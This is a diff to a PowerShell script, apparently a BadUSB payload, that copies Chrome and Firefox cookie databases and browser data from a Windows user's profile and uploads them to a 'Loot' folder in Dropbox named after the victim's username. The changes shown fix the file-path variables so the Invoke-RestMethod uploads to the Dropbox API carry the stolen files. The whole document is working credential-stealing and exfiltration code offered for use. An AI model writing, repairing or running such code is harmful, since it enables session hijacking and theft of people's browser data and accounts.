@@ -1,3 +1,14 @@
+# This script will grab Firefox and Chrome Cookies along with Browser Data for Chrome, Edge, Firefox, and Opera then upload those to
+# DropBox in a new folder called Loot followed by a Folder named after the username the data came from
+#
+# The extraction of Browser Data was copied from I-Am-Jakoby's browserData.ps1 script 
+# https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/blob/main/Payloads/Flip-BrowserData/browserData.ps1
+#
+# Target: Windows 10/11
+# Version: 1.0
+# 
+
+
 $GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
 $GfilePath = "$env:temp\Cookies"
 $GdestinationPath = "/Loot/$env:USERNAME/Cookies"
@@ -113,7 +124,7 @@ try {
         "Dropbox-API-Arg" = '{"path": "' + $GdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
     }
 
-    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+    $fileContent = [System.IO.File]::ReadAllBytes($GfilePath)
     $url = "https://content.dropboxapi.com/2/files/upload"
 
     Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $GfilePath -ContentType "application/octet-stream"
@@ -133,7 +144,7 @@ try {
         "Dropbox-API-Arg" = '{"path": "' + $FdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
     }
 
-    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+    $fileContent = [System.IO.File]::ReadAllBytes($firefox_cookies_path)
     $url = "https://content.dropboxapi.com/2/files/upload"
 
     Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $firefox_cookies_path -ContentType "application/octet-stream"
@@ -153,7 +164,7 @@ try {
         "Dropbox-API-Arg" = '{"path": "' + $BdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
     }
 
-    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+    $fileContent = [System.IO.File]::ReadAllBytes($BfilePath)
     $url = "https://content.dropboxapi.com/2/files/upload"
 
     Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $BfilePath -ContentType "application/octet-stream"
